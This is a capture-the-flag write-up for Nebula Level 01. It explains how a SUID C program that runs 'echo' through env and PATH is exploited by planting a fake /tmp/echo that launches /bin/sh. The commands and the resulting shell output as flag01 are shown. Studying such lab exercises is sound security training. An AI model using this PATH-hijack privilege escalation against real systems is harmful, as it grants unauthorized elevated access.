# Level 01
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the `level01` account with the password `level01`. Files for this level can be found in `/home/flag01`.

## Source code
```c++
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

## Writeup
The problem in this code is use `eUID` and run `echo` command in simple relative path.
We can cange the `$PATH` variable to run a custom echo command, because `/home/flag01/flag01` binary has `SUID` setted.

Write a custom `echo` command inside `/tmp` directory:

```bash
echo '/bin/sh' > /tmp/echo
```

Now change the `$PATH` variabile adding `/tmp` at the start:

```bash
export PATH=/tmp:$PATH
```

Now if one user launch `echo` command, he launch a `/bin/sh` shell.
Go to `/home/flag01` directory and run `./flag01` binary to get a shell with flag01 account, verified by writing `id` command:

```bash
level01@nebula:/home/flag01$ ./flag01 
sh-4.2$ id
uid=998(flag01) gid=1002(level01) groups=998(flag01),1002(level01)
```

Now we can run `getflag` command:

```bash
sh-4.2$ getflag
You have successfully executed getflag on a target account
```